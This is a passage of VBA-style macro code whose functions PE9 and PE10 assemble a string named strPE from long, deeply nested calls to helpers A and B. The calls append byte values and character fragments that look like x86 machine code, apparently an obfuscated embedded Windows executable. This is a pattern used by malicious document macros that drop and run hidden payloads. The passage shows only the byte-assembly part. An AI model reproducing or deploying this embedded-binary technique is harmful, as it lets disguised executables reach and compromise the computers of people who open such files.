    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 217), 205), "~"), 17), 1), 0), "]"), 194), 16), 0), 139), 6), " "), 195), "}"), 153), 15), "G"), 230), "B="), 248), 145), 137), "F"), 16), 245), "V "), 15), 132), 208), 169), 0), 243), "PW"), 255), 12), "|"), 193), 231), 0), "U"), 196), 8), 133), 192), 15), 132)
    strPE = A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(strPE, 189), 0), 0), "I"), 128), 224), 1), 22), "t"), 26), 139), "M"), 20), 19), 1), 0), 0), 0), 0), 139), "V "), 128), ":"), 0), 15), 133), 8), 0), 0), "C"), 233), 138), 0), 0), 0), "zT"), 152), 128), "_"), 0), "t"), 228), 139), "M"), 20), 137), 1), 235)
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(strPE, "t"), 139), "V"), 12), 202), "N"), 24), 217), 139), 153), 137), "V"), 12), ";"), 200), 165), "Y"), 199), "F p"), 2), "A"), 0), 138), 7), 220), ":u"), 19), 139), 10), 16), 138), 138), 16), "_^"), 136), 16), "u}v"), 1), ">]"), 194), 16), 0), 139)
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(strPE, "F"), 4), 133), 132), "t"), 31), 139), "V"), 28), 139), "N"), 16), 187), 139), 2), "P"), 232), 159), "J"), 0), 0), 139), "N"), 8), 254), "h"), 223), 243), "@"), 0), "Q"), 236), "V"), 4), 131), 196), 16), 183), "EJ"), 138), "V"), 16), "_^"), 136), 16), 184), "|"), 17)
    strPE = A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 248), 0), "]"), 194), 16), 0), 139), "N"), 28), 141), 20), 129), 139), 235), 20), "X"), 16), 199), 247), 213), 212), 2), "E"), 0), 255), "F"), 12), 139), "%"), 16), 138), "N"), 16), 254), 180), 192), 136), 10), "^]"), 194), 16), 143), 8), "~"), 16), "-"), 15), 132), 250)
    strPE = A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(strPE, 254), 255), 255), 139), 137), 164), 128), ":"), 0), "u"), 3), 230), "F"), 12), 139), "F"), 4), 133), 214), "t$"), 128), "?3t"), 31), 139), "N"), 28), 139), "F"), 16), "P"), 139), 17), "R"), 232), 145), "H"), 0), 0), "P"), 139), "F"), 8), "h"), 204), 243), "@"), 0)
    strPE = A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(strPE, "P"), 255), 153), 4), 151), 196), 27), 139), "U"), 16), 138), "N"), 16), "_.|"), 17), 1), 0), 136), 10), "^"), 22), 194), 233), 0), "o"), 144), 144), 144), 144), 154), 144), "he"), 144), 144), "5."), 144), "U"), 139), 243), "[VW"), 232), 245), 1), 0)
    strPE = B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 133), 14), 15), 234), 253), "g"), 0), 0), 131), 234), 220), 222), "?"), 0), 20), 15), "W"), 238), 0), 0), 0), 161), 132), 3), "A"), 0), 133), 192), 15), 133), 225), 0), 0), 144), 199), 5), 202), 247), "A"), 222), 1), 0), 0), 171), 255), 21), "\d@")
    strPE = A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(strPE, "V"), 139), 240), 133), 246), "ta"), 161), "X"), 188), 158), 0), "!"), 192), "u"), 29), "Ph"), 16), 248), "@&j"), 4), 232), 199), 232), "]"), 0), 131), 23), 12), 163), "X"), 3), "GW"), 133), 192), 15), 132), 175), "p"), 0), 0), " M"), 252), "$"), 2)
    strPE = A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(strPE, 255), 208), 139), 161), 133), 175), "t 7U"), 252), 139), "E"), 12), "RV"), 190), "m,H8z"), 139), "r"), 8), 131), 226), 12), "V"), 137), 236), 194), 21), "X"), 192), "@"), 0), "S"), 255), 21), "Z"), 192), "@"), 181), 139), 216), "j"), 236), "S"), 206)
    strPE = A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(strPE, 21), "$"), 193), "@"), 0), "P"), 232), 27), 0), 28), 0), "G}"), 16), 131), 196), 12), 133), 255), "t-"), 141), "4"), 133), 4), 0), 0), 0), "V"), 255), "R\"), 193), "@"), 0), 131), 29), 4), 137), 7), 255), 208), "$"), 193), "@"), 0), 139), "?"), 139), 206)
    strPE = A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(strPE, 139), "0"), 139), 209), 193), 233), "4"), 243), 165), 139), 202), 131), 189), "8"), 243), 164), "S"), 255), "<P"), 192), 0), 0), 139), "5("), 193), "@"), 0), 255), 214), 139), 8), "[1"), 201), "t"), 22), 255), "`"), 139), "8x"), 214), "W"), 199), 240), 182), 0), 0)
    strPE = B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(strPE, 0), 255), 21), "0"), 193), 226), "B"), 131), 196), 4), "3"), 192), 232), "^"), 139), 229), "]"), 194), 132), 0), "j"), 1), 20), 21), "L"), 192), "@"), 0), 233), 238), 255), 255), 255), "="), 144), 239), 144), 144), 144), 144), 144), 144), ">"), 144), "U"), 139), 236), 197), "/E")
    strPE = A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(strPE, 12), "S"), 139), "]"), 16), "V"), 133), "yW}"), 24), 187), "K"), 0), 0), 0), "f"), 131), 22), 0), "u"), 4), "f"), 131), "x"), 2), 0), "t"), 6), 230), 239), 192), 2), 235), 237), "+E"), 160), 131), "X"), 2), 209), 248), 137), "E"), 16), 204), 4), 25), 4)
    strPE = B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(strPE, 0), 0), 0), 203), 255), "i4"), 193), "@"), 0), "%"), 248), 139), "E"), 16), 141), 159), "@}"), 24), 137), "u"), 252), 255), 21), "_"), 193), 34), 0), 131), 196), 8), 141), "M"), 252), 137), 7), 141), "U"), 16), "QP"), 139), "E"), 12), "RP"), 232), "4M")
    strPE = B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(strPE, "w"), 0), 139), "n"), 14), "C"), 14), "+"), 242), "VP"), 255), 21), " "), 193), "@"), 0), 185), 1), 0), "+"), 0), 217), 196), 27), "9"), 217), 137), 7), "~"), 205), 141), 163), 255), 141), "G"), 4), 137), "M"), 12), 199), 139), "P"), 252), 131), 194), 2), 137), 16), "n")
    strPE = A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(strPE, "0"), 138), 22), "F>"), 210), 137), "Pu"), 137), "fU"), 12), 131), 192), 4), "J"), 137), "U"), 12), "uz"), 139), "E"), 8), 199), 4), 143), "("), 0), 0), 249), 137), "8_"), 139), 195), "^i"), 139), 27), "]"), 195), 144), 144), "B"), 144), 144), 144), 144)
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 144), 144), "U"), 194), 236), 129), 236), 152), 171), 0), 0), 161), 136), 3), "A"), 0), 139), 200), "@"), 133), 201), ":"), 136), 3), "A"), 29), "t"), 249), "3"), 168), 139), 229), 164), 195), 141), "U"), 248), "R"), 232), 215), "G"), 0), 0), 131), "m"), 4), 133), 192), 15), 133)
    strPE = A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(strPE, 130), 0), 0), 0), 229), 216), "`"), 192), "@"), 0), 163), "T"), 9), "A"), 0), 232), 220), 233), 172), 255), 133), 192), "u"), 15), "T"), 11), "PqE"), 252), 201), 232), 137), "F"), 2), 255), 133), 194), "t"), 9), "("), 34), 219), 243), 0), 139), 229), "]"), 195), 139)
    strPE = A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "O"), 252), "h$"), 244), "@"), 0), "Q"), 232), "a"), 246), 255), 255), 141), 160), "h"), 254), 195), 255), 177), "j"), 2), 255), 21), 208), 193), "@"), 0), 133), 172), "u9f"), 127), 133), "h"), 254), 255), 255), "<"), 2), "u#3"), 201), 138), 204), 132), 201), 29)

    PE9 = strPE
End Function

Private Function PE10() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(strPE, 27), 139), "U"), 252), "R"), 232), "b0"), 0), 0), 139), "E"), 252), "P"), 232), "PD"), 0), 0), 131), 196), 8), "3"), 192), 139), 229), "]~"), 255), 21), 246), 193), "@"), 0), 23), 17), 0), 0), 0), 139), 229), "]"), 195), 205), 174), 136), 3), "A"), 0), "H")
    strPE = A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 163), 136), "AA_u"), 23), "1."), 203), 255), 255), 255), 21), 212), 193), "@"), 0), 161), "TKA"), 162), 231), "^"), 21), "d"), 196), "@"), 4), 202), 144), 144), 144), 144), 144), 144), 144), 31), 144), 144), 144), "U"), 175), 168), 138), "E"), 20), "W"), 168)
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "Ot"), 19), 20), "E"), 8), "_"), 199), 0), 0), 206), 0), 0), 184), 135), 12), 148), 0), "]"), 194), 16), 0), 168), "}"), 13), 129), 255), 0), 4), 0), 181), "v"), 19), 173), "M"), 8), 15), 22), 0), 0), 0), "_"), 199), 1), 0), 0), 21), "*]"), 194)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(strPE, 16), 0), "S"), 139), "]"), 16), "Vh$0"), 0), 253), "S"), 232), 4), 234), 255), 255), 139), "u"), 8), "Yw"), 137), "<"), 137), "H"), 4), "*"), 188), 137), "z"), 189), 139), "<"), 141), "<"), 191), 137), 24), 139), 22), 193), 231), 2), 137), "J"), 12), "Tv")
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "WS"), 137), 136), "A"), 16), 0), 0), 139), 146), 137), "o"), 20), " "), 0), 0), 139), 6), 137), 136), 24), "0"), 0), 172), 232), 199), 233), 255), 255), 139), 14), "WS"), 137), 129), 28), "0"), 253), 0), 232), 184), 233), 255), 233), 139), 22), "^[_"), 223)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 130), " 0"), 0), 0), 135), 192), "v"), 194), 16), 0), "Q"), 144), 153), 144), 144), 144), 144), "U"), 139), 236), 139), "E$SVW"), 139), 227), 4), "[P"), 170), ";"), 202), "u#_^"), 184), 12), 0), 0), 0), 153), 138), 194), 8), 0), 139)
    strPE = A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(strPE, 144), 28), "F"), 0), "w"), 139), "]"), 17), 141), 12), 137), 139), 164), 12), "<"), 138), 185), 5), 0), 0), 0), 243), 165), "oS"), 4), 185), 1), 0), 0), 0), ";"), 209), 15), 133), 146), 18), 205), 0), 139), "S'"), 139), "z"), 4), 138), "S"), 8), 132), 209)
    strPE = A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(strPE, "t/"), 139), "P"), 239), "Y"), 201), 133), "rvh"), 141), "^"), 16), "9>"), 214), 8), "A"), 27), 198), 4), ";"), 202), "g"), 244), ";"), 168), "u"), 19), 129), 250), 194), 4), 0), 0), "U"), 11), 137), "|"), 136), 16), 139), "H"), 12), "A"), 222), "H"), 12), 246)
    strPE = A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(strPE, "C"), 8), 4), "tR "), 144), 16), 16), 0), 0), "3"), 138), 133), 231), "v"), 18), 141), "RM"), 16), 217), 0), "9>t"), 8), "A"), 131), 198), 4), ";"), 202), 209), 244), ";"), 202), "u"), 168), " "), 250), "#"), 4), 0), 0), "s"), 164), 137), 188), 136)
    strPE = B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 246), 16), 242), 240), 139), 136), 16), 16), "s"), 0), "A"), 137), 136), 159), 16), 0), "Y"), 246), "C"), 8), "rt>"), 139), 144), 20), 21), 0), 0), "3"), 201), 133), 210), "v"), 18), 141), 176), 24), " "), 0), 2), "9>t"), 8), 1), 131), 198), 4), ";")
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(strPE, 202), "r"), 244), ";"), 202), "u"), 28), 129), "6"), 233), 4), 0), 0), 133), 206), 137), 188), 136), 24), " "), 0), 0), 139), 136), 20), " "), 0), "5A"), 137), 141), 20), " "), 0), 0), ";"), 184), 24), "0"), 0), 0), "~h"), 137), 185), 24), 20), 0), 0), 139)
    strPE = B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "H"), 4), "_A^"), 137), "H"), 4), "a"), 192), "[]"), 194), "J"), 0), "_"), 220), 184), 158), 0), 0), 0), "[]"), 212), 8), 157), 144), 144), 144), 144), 144), 217), 144), 144), 144), 144), 144), "U"), 139), "|"), 131), 248), 8), 139), "E"), 12), "SVW")
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(strPE, 131), "x"), 4), 1), 15), ";w"), 1), 0), 0), 139), "X"), 12), 139), 236), 8), "3"), 201), 139), "P"), 4), "{"), 225), 206), 133), "af}"), 248), "v"), 21), 139), 176), 28), "0"), 0), 0), 131), 198), 146), ";"), 30), "+"), 22), "A"), 206), 198), 20), ";"), 4)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(strPE, ",a_?"), 154), 127), 251), 1), 0), "["), 196), 160), "]"), 194), "#"), 0), 139), 217), 26), 141), "r"), 255), "L3Q"), 161), 4), "sO"), 141), 219), 155), 141), "<"), 137), 193), 227), 2), 193), 231), 2), 146), 209), 137), "}"), 208), 137), "U"), 252), 219)
    strPE = A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(strPE, 221), 28), "0"), 0), 0), 139), "v2"), 139), "R"), 12), 141), "o"), 15), ";V"), 231), "u"), 5), 255), "*"), 4), 235), 16), 218), "<"), 11), 216), 5), "l"), 0), 0), 243), 165), 139), "}"), 8), 131), 253), 20), 139), "Mq"), 24), 199), 20), "Ik}"), 8)
    strPE = B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(strPE, 137), "q"), 181), "uB"), 139), "}"), 248), 244), "P"), 12), "3"), 201), 133), 210), "v."), 141), "p"), 16), "9>t"), 10), "g"), 131), 198), 4), ";+p"), 244), 235), 29), "J;"), 202), "s"), 21), 141), "T"), 136), 16), "dj"), 4), "A"), 137), "2o")
    strPE = A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "p"), 12), 131), 194), 128), "N;"), 206), "r"), 28), 255), "5"), 12), 139), "W"), 16), 236), 0), 241), "3"), 201), 133), 20), "v:U"), 236), 20), 16), 0), "&9>t"), 10), "A"), 131), 198), 4), ";"), 202), "r"), 244), 235), "&"), 214), ";"), 202), "s"), 27)
    strPE = A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(strPE, 231), 148), 136), "3"), 16), 0), 0), 139), "r"), 4), "A"), 226), "2"), 139), 176), 16), 16), 185), 135), 131), 194), 172), "N;"), 206), "r"), 236), 255), 227), "4"), 16), 0), 229), 139), 144), 11), " "), 0), 0), "3"), 201), 133), 210), 136), ":"), 141), 176), 24), 192), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(strPE, 0), "9>t"), 10), "A"), 163), 198), 4), ";&r"), 244), 235), "&J"), 11), 202), "s"), 27), 141), 148), 136), 24), " "), 0), 0), 139), "r"), 4), "n"), 137), "2"), 139), "S"), 13), " "), 0), 0), 165), 194), 4), "N"), 9), 206), 147), 236), 255), 136), 150)
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(strPE, " E"), 0), 139), 136), 24), "0"), 0), 0), ";"), 223), "u"), 11), 133), 201), "~"), 7), "I6"), 136), 24), "0"), 236), "&_^3"), 197), "["), 139), 229), "]"), 194), 8), 0), "_^"), 184), 9), 0), 0), "T["), 139), 229), "]"), 194), 8), 0), 15)
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(strPE, 144), 144), 144), 144), "U"), 139), 236), 167), " 0"), 0), 0), 232), 156), "T"), 0), 0), "S"), 139), "]"), 211), "VW"), 139), "C"), 4), 133), "e."), 20), 139), "-"), 17), "_^[b"), 0), 0), 0), 0), 0), "3"), 192), 11), 229), "]"), 194), 20), 0)
    strPE = A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(strPE, 139), "V"), 16), "3}"), 12), 133), 246), 127), 10), "|"), 4), 144), 229), "s"), 195), "3"), 192), 15), "%j"), 245), "h@z"), 15), 250), 179), "B"), 232), 179), "Q"), 0), 210), 244), "`h@B"), 131), 0), "VW"), 137), "E"), 236), 232), "OS"), 0)
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(strPE, 149), 137), "E"), 240), 13), "E"), 236), 185), 1), 4), 0), 167), 141), "s"), 12), 141), 189), 228), 223), 255), 255), "P"), 243), 165), 216), 1), 4), 0), 0), 141), 179), 16), 16), "{"), 0), 141), 189), 232), 132), 255), "Bh"), 149), 232), 239), 255), 255), 243), ">7")
    strPE = A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 1), 162), 0), 0), 141), 244), 20), " "), 0), 0), 141), 189), 224), 207), 255), 255), 2), 133), 228), 202), 255), 255), 243), 165), 141), 141), 224), 207), 255), 255), "Q"), 139), 139), "^"), 223), 0), 0), "R*PQ"), 255), "!"), 230), 193), "@"), 0), 139), 218), 20)
    strPE = A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(strPE, "3"), 149), "."), 199), 178), 141), "}n"), 139), "5"), 128), 193), 229), "_"), 255), 214), 133), 192), 15), 132), "W"), 1), 0), 0), "|"), 214), 221), 155), 5), 128), 252), 10), 0), "tT"), 142), "]l8"), 0), "u"), 246), "_"), 130), 184), "w"), 17), 1), 0), 211)
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(strPE, 139), 229), "]"), 194), 20), "7"), 139), "C"), 4), 137), "}"), 16), ";"), 250), 137), "}"), 248), 206), 134), 15), 1), 0), 0), 137), "}"), 8), 137), "}"), 252), 139), 131), 28), "0"), 0), 0), 3), 199), 131), ":"), 4), 1), 15), 133), 25), 1), 0), 0), "`Hd")
    strPE = A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 141), 149), 228), 30), 255), 255), "R"), 139), "q"), 4), 18), 137), 23), 244), 236), 133), 203), 0), 0), 133), 192), "u&"), 141), 133), 232), 239), 255), 255), "PV"), 232), "tT"), 0), 0), "7"), 192), "u"), 21), 141), 141), 14), 207), "X"), 255), "QV"), 232), 211)
    strPE = A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "T"), 0), 0), 133), 192), "&"), 132), 157), 0), 0), 0), 139), 28), "=0"), 0), 0), 139), "E"), 8), 3), 221), 139), 187), 240), "0"), 0), "q"), 192), 3), 185), 226), "}"), 0), 156), 243), 165), 139), 185), " 0@"), 229), 139), "}N"), 178), 199), "D"), 238)
    strPE = A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 10), 0), 0), "y"), 133), 228), "["), 255), 255), "PW"), 220), 254), "T"), 0), 0), 139), "u"), 8), 133), 192), "t"), 15), 139), 139), " ^"), 0), 0), 128), "L"), 128), 10), 1), 141), "R"), 160), 10), 141), 149), 232), 239), 255), 255), "RW"), 232), 1), "T"), 0)
    strPE = B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(strPE, 162), 133), 192), 154), 15), 139), 131), " 0"), 0), 0), 128), "%"), 161), 10), 4), 229), "D0"), 10), 141), 141), 224), 207), 255), 255), "Q"), 251), "*"), 225), "S"), 0), 0), 179), 192), "t"), 31), "9"), 147), " -"), 0), 0), 128), "N2"), 10), 16), 172), "D")
    strPE = A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(strPE, "2"), 214), 139), "M"), 16), 208), "}"), 252), "I"), 131), 198), 20), 137), "M"), 16), 137), 184), 8), 139), "E"), 194), 139), "K"), 4), "@"), 131), "4"), 20), 169), 193), 137), "E"), 248), 137), "}"), 252), 15), 130), 249), 254), 255), 255), 129), 255), 139), "M"), 20), 139), "E"), 17)
    strPE = B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(strPE, 182), 1), 139), "E"), 24), ";"), 199), "t"), 8), 139), 211), " 0"), 0), 127), 161), 16), 227), "^3"), 192), "["), 139), 229), "]"), 194), 229), 0), "_^"), 184), "E"), 0), "u"), 0), "["), 139), 17), "]"), 194), 20), 0), 206), 144), 144), 144), "U"), 139), 236), "S")
    strPE = A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(strPE, "VW"), 139), "}U"), 133), 255), "u"), 5), 191), 239), "<"), 0), 0), 139), "EL"), 182), "u"), 8), "P"), 211), 232), 235), 1), 219), "r"), 139), "]"), 230), 139), "M"), 16), 131), 196), 8), "SQW"), 255), 21), 188), 193), "@"), 22), 139), 22), 137), "B"), 4)
    strPE = B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(strPE, 139), 6), 139), "@"), 4), 210), "J"), 255), ","), 30), 139), "5"), 216), 193), "a"), 0), 255), 214), 133), 192), 15), 218), 148), 0), 0), 0), 255), 214), "_1"), 5), 128), 252), 10), 0), 200), "{"), 194), 20), 200), 131), "="), 204), 183), "A"), 0), 20), "|"), 13), "M")
    strPE = A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(strPE, 0), 195), 1), "P"), 255), 21), "p"), 192), "@"), 0), 235), "D"), 255), 246), "l"), 199), "@"), 0), 139), 22), "j"), 2), "j"), 183), 141), "M"), 12), "j"), 153), "Q"), 139), "J"), 4), "PQP"), 255), 21), "%"), 192), "@"), 0), "L"), 192), "t"), 20), 139), 22), 139), 31)
    strPE = B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(strPE, 4), "Pr"), 21), 214), 193), "@"), 0), 139), 14), 139), 183), 12), 137), "Q"), 4), 139), "E"), 16), 139), "NLPWS"), 232), 152), 0), 0), "r"), 139), 22), 131), 200), 255), "d"), 196), 16), 137), 200), " h"), 163), "W"), 248), 0), "h"), 224), "fb")
    strPE = B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 0), 137), "B$"), 252), 204), 199), "@("), 0), 0), 0), "la"), 6), "V"), 139), 14), "Q"), 232), ","), 239), "A"), 255), "_^3K;]"), 194), 20), 0), 144), 144), 144), "U"), 139), 227), "V"), 139), 253), 8), 139), "Fw"), 131), 248), 255), "t")
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(strPE, ")P"), 255), 21), "8"), 145), "@"), 0), "D"), 248), 255), "u"), 22), 139), "5"), 31), 193), "i"), 201), 255), 214), 133), 192), "t)"), 255), 214), 5), 161), 252), 15), 230), "^]"), 195), 199), "F"), 4), 255), 255), 226), 255), 139), 213), "@"), 133), 192), "t"), 17), 180)
